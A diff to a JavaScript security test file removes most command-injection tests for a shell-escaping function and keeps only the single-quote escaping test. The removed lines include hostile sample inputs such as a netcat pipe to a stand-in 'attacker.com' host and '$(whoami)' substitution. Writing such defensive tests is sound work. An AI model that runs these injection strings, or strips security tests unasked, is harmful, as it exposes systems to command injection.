@@ -15,46 +15,6 @@ import {
 
 describe("Security Tests - Command Injection Prevention", () => {
   describe("shellEscapeSingleQuotes", () => {
-    test("should reject null bytes", () => {
-      expect(() => shellEscapeSingleQuotes("hello\x00world")).toThrow("null byte");
-    });
-
-    test("should reject inputs exceeding 4096 chars", () => {
-      const longInput = "a".repeat(4097);
-      expect(() => shellEscapeSingleQuotes(longInput)).toThrow("too long");
-    });
-
-    test("should reject command substitution $()", () => {
-      expect(() => shellEscapeSingleQuotes("$(whoami)")).toThrow("dangerous pattern");
-    });
-
-    test("should reject backtick command substitution", () => {
-      expect(() => shellEscapeSingleQuotes("`whoami`")).toThrow("dangerous pattern");
-    });
-
-    test("should reject variable substitution ${}", () => {
-      expect(() => shellEscapeSingleQuotes("${HOME}")).toThrow("dangerous pattern");
-    });
-
-    test("should reject pipe operators", () => {
-      expect(() => shellEscapeSingleQuotes("cat | nc attacker.com 4444")).toThrow("dangerous pattern");
-      expect(() => shellEscapeSingleQuotes("cat || nc attacker.com 4444")).toThrow("dangerous pattern");
-    });
-
-    test("should reject command chaining", () => {
-      expect(() => shellEscapeSingleQuotes("cmd; malicious")).toThrow("dangerous pattern");
-      expect(() => shellEscapeSingleQuotes("cmd && malicious")).toThrow("dangerous pattern");
-    });
-
-    test("should reject newline injection", () => {
-      expect(() => shellEscapeSingleQuotes("cmd\nmalicious")).toThrow("dangerous pattern");
-      expect(() => shellEscapeSingleQuotes("cmd\r\nmalicious")).toThrow("dangerous pattern");
-    });
-
-    test("should reject escaped dollar signs", () => {
-      expect(() => shellEscapeSingleQuotes("cmd \\$malicious")).toThrow("dangerous pattern");
-    });
-
     test("should safely escape single quotes", () => {
       const result = shellEscapeSingleQuotes("it's a test");
       expect(result).toBe("'it'\\''s a test'");
